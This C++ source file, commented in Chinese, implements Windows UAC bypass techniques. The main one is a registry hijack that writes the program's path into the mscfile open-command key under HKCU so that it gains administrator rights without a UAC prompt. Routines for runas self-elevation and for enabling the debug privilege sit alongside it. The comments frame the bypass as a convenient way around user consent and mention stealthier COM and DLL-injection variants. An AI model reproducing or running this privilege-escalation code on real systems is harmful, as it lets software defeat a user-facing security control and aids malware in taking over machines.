#include <cmath>     //头文件
#include <ctime>
#include <time.h>
#include <cstdio>
#include <string>
#include <tchar.h>
#include <fstream>
#include <cstdlib>
#include <conio.h>
#include <iostream>
#include <windows.h>
#include <algorithm>
#include <tlhelp32.h>             //检查进程用的
using namespace std;


//函数功能引入：

//UAC，全程为"User Account Control"，是在Vista引入的一种安全机制。
//它可以在程序尝试获取管理员权限时弹窗询问，之后再允许程序获取管理员权限。
//这就导致杀毒软件等需要管理员权限作为基础的程序启动速度需要取决于用户点击的速度。
//即使可以关闭UAC弹窗，可是仍然会有许多企业等计算机配备了UAC。
//而BypassUAC(Bypass User Account Control)技术正是解决这个问题的，
//它通过避开UAC检测机制和Windows特性达到不弹出UAC窗口直接获取管理员权限的效果。

//比较好用的方法有两个：
//1、利用注册表进行BypassUAC
//	Windows有一类程序在运行时是不会触发UAC弹窗的，svchost.exe等程序就可以。
//	它会通过写入注册表白名单而达到BypassUAC。
//	但是这种办法有一个缺点，因为我们不知道用户自定义的注册表访问权限，
//	如果是服务器之类的，安全级别较高，没有管理员就没法写入，这种办法就不行了，
//	所以我们引入第二种办法，利用COM组件实现的UAC

//2、利用COM组件进行BypassUAC
//	这个办法的优点就是它不受用户控制，可以不留痕迹实现BypassUAC。
//	缺点也非常明显，一听COM组件这个名字就显得比较难，实际代码也很长。
//	这个办法还有个缺点，就是目标程序必须是可信程序，这一步就要用到DLL注入、DLL劫持等技术，太麻烦了就不用了。

/*
 *函数名称：SetBypassUACReg(lpszExePath)
 *函数参数：无
 *函数功能：通过基于注册表的BypassUAC达到绕过UAC弹窗启动管理员权限程序
 *函数返回值：BOOL类型
 *	为TRUE：成功执行
 *	为FALSE：执行失败
*/
BOOL SetBypassUACReg() {
	char lpszExePath[MAX_PATH] = { 0 };              //定义BypassUAC的路径
	GetModuleFileNameA(NULL, lpszExePath, MAX_PATH);  //提取路径
	HKEY hKey = NULL;
	// 创建项
	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0,
	                 KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (NULL == hKey) {
		return FALSE;
	}

	// 设置键值
	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE *)lpszExePath, (1 + ::lstrlen(lpszExePath)));

	//关闭注册表
	::RegCloseKey(hKey);

	return TRUE;
}

/*
 *函数名称：GetAdmin(Showcmd)
 *函数参数：
 *	Showcmd：显示模式
 *函数功能：获取管理员权限
 *函数返回值：bool类型
 *	为true：成功执行
 *	为false：执行失败
*/
bool GetAdmin(int Showcmd) {
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;  //判断是否有管理员权限
	PSID AdministratorsGroup;
	BOOL b = AllocateAndInitializeSid(
	             &NtAuthority,
	             2,
	             SECURITY_BUILTIN_DOMAIN_RID,
	             DOMAIN_ALIAS_RID_ADMINS,
	             0, 0, 0, 0, 0, 0,
	             &AdministratorsGroup);
	if (b) {
		CheckTokenMembership(NULL, AdministratorsGroup, &b);
		FreeSid(AdministratorsGroup);
	}

	if (b == TRUE)
		return 0;
	TCHAR Path[MAX_PATH];
	ZeroMemory(Path, MAX_PATH);
	::GetModuleFileName(NULL, Path, MAX_PATH);           //获取程序路径
	HINSTANCE res;
	res = ShellExecute(NULL, "runas", Path, NULL, NULL, Showcmd);
	exit(0);
	if ((int)res > 32)
		return 1;
	else
		return 0;
}

/*
 *函数名称：GetDebugPrivilege()
 *函数参数：无
 *函数功能：获取Debug权限
 *函数返回值：bool类型
 *	为true：成功执行
 *	为false：执行失败
*/
bool GetDebugPrivilege() {
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return   false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return false;
	}
	return true;
}